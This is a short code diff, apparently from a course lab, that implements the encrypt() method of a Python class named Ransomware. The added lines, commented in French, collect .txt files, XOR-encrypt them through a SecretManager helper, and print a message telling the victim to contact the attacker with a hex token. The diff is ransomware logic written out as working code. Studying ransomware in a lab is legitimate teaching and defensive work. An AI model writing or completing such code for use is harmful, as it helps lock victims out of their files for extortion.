@@ -39,8 +39,24 @@ class Ransomware:
         raise NotImplemented()
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # 1. Lister les fichiers txt
+        txt_files = self.get_files("*.txt")
+        self._log.debug(f"Found {len(txt_files)} txt files to encrypt.")
+
+        # 2. Créer le SecretManager
+        secret_manager = SecretManager()
+
+        # 3. Appeler setup()
+        secret_manager.setup()
+
+        # 4. Chiffrer les fichiers
+        secret_manager.xorfiles(txt_files)
+
+        # 5. Afficher un message permettant à la victime de contacter l'attaquant avec le token au format hex
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
+
+        
 
     def decrypt(self):
         # main function for decrypting (see PDF)
